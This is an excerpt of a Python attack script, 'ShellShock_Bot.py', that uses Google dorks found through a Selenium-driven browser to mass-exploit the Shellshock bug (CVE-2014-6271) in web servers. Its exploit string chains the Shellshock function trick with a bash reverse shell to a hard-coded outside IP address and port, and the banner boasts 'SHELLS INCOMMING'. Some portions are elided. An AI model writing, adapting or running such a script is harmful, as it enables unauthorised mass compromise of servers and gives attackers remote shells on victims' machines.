...
print "###########################################################"
print "###                  ShellShock_Bot.py                  ###"      
print "###          Mass Google ShellShock Dork Exploiter      ###"
print "###                   CVE-2014-6271                     ###"
print "### *************************************************** ###"
print "###                   \!/Anonsec\!/                     ###"
print "###              \!/ SHELLS INCOMMING \!/               ###"                      
print "###                                                     ###"
print "###                    _.-''|''-._                      ###"
print "###                 .-'     |     `-.                   ###"
print "###               .'\      |       /`.                  ###"
...
#all I did lol obviously change it to your chromedriver path
driver = webdriver.Chrome('/home/dave/Documents/Python/chromedriver_linux64/chromedriver')  
def start_browser():
    br = driver
...
def action(url):
    ...
    global VULN_FOUND
    exploit = "() { :;}; echo 'Shellshock: Vulnerable' && () { :;}; /bin/bash -i >& /dev/tcp/185.10.68.178/31337 0>&1"
    ua = get_ua()
...
def main():
    args = parse_args()
    if not args.search:
        sys.exit("[!] Enter a term or phrase to search with the -s option: -s '@d4v3_'")
